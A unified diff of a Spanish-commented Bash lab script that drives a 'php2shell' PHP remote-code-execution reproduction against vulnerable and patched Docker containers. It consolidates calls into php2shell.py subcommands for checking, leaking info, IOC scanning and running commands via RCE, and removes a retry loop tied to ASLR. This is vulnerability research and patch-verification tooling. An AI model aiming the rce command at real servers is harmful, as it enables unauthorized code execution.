@@ -126,11 +126,11 @@ cmd_test() {
   local what="${1:-all}"
   case "$what" in
     vuln)
-      python3 scripts/php2shell_repro.py "$VULN_URL" --container "$VULN_CTR" "${@:2}"
+      python3 php2shell.py check "$VULN_URL" --attempts 3 --container "$VULN_CTR" "${@:2}"
       local code=$?
       if [ $code -eq 0 ]; then ok "test-vuln: VULNERABLE (exit 0, esperado)"; else bad "test-vuln: exit $code inesperado"; exit $code; fi ;;
     patched)
-      python3 scripts/php2shell_repro.py "$PATCH_URL" --container "$PATCH_CTR" "${@:2}" 2>/dev/null
+      python3 php2shell.py check "$PATCH_URL" --attempts 3 --container "$PATCH_CTR" "${@:2}"
       local code=$?
       if [ $code -eq 1 ]; then ok "test-patched: NOT_VULNERABLE (exit 1, esperado)"; else bad "test-patched: exit $code inesperado"; exit $code; fi ;;
     all)
@@ -140,10 +140,7 @@ cmd_test() {
 }
 
 cmd_iocs() {
-  python3 scripts/php2shell_iocs.py
-  local code=$?
-  [ $code -eq 0 ] && ok "logs limpios" || info "hallazgos en los logs (exit $code)"
-  exit $code
+  python3 php2shell.py iocs
 }
 
 cmd_vendor() {
@@ -173,14 +170,7 @@ cmd_rce_target() {
 cmd_rce() {
   [ -z "${1:-}" ] && die "uso: p2s.sh rce <cmd>   (p. ej. p2s.sh rce \"id\", <=14 bytes)"
   [ -f "$VENDOR/tools/php2shell_stock_poc.py" ] || cmd_vendor
-  local cmd="$1"; shift
-  local okflag=0
-  for i in 1 2 3 4 5 6 7 8; do
-    printf "${c_b}──${c_0} intento ${c_b}$i/8${c_0} (contenedor fresco) ──\n"
-    cmd_rce_target >/dev/null 2>&1
-    if python3 scripts/php2shell_rce.py -c "$cmd" "$@"; then okflag=1; break; fi
-  done
-  if [ $okflag -eq 0 ]; then bad "sin RCE en 8 intentos (ver EXPLOTACION.md §4.2 — lotería ASLR)"; exit 1; fi
+  python3 php2shell.py rce "$@"
 }
 
 cmd_rce_canonical() {
@@ -190,17 +180,17 @@ cmd_rce_canonical() {
   if [ $code -eq 0 ]; then ok "RCE canónico: Proven - Lab-Assisted RCE (evidencia en $VENDOR/runs/)"; else bad "rce-canonical: exit $code"; exit $code; fi
 }
 
-cmd_info()  { python3 scripts/php2shell_rce.py --info; }
-cmd_check() { python3 scripts/php2shell_rce.py --check; }
+cmd_info()  { python3 php2shell.py info; }
+cmd_check() { python3 php2shell.py leak; }
 
 cmd_demo() {
   printf "${c_b}════════ PASO 1 · Identidad de los workers ════════${c_0}\n"
   printf "vulnerable → "; curl -s "${VULN_URL}whoami.php"
   printf "parcheado  → "; curl -s "${PATCH_URL}whoami.php"
   printf "\n${c_b}════════ PASO 2 · Trigger contra el VULNERABLE ════════${c_0}\n"
-  python3 scripts/php2shell_repro.py "$VULN_URL" --attempts 1 --container "$VULN_CTR"
+  python3 php2shell.py check "$VULN_URL" --attempts 1 --container "$VULN_CTR"
   printf "\n${c_b}════════ PASO 3 · Trigger contra el PARCHEADO ════════${c_0}\n"
-  python3 scripts/php2shell_repro.py "$PATCH_URL" --attempts 1 --container "$PATCH_CTR"
+  python3 php2shell.py check "$PATCH_URL" --attempts 1 --container "$PATCH_CTR"
   printf "\n${c_b}════════ PASO 4 · Evidencia cruda en los logs ════════${c_0}\n"
   docker logs "$VULN_CTR" 2>&1 | grep -E "Fatal error|Segmentation" | tail -4
   printf "\n${c_b}════════ PASO 5 · IOCs ════════${c_0}\n"
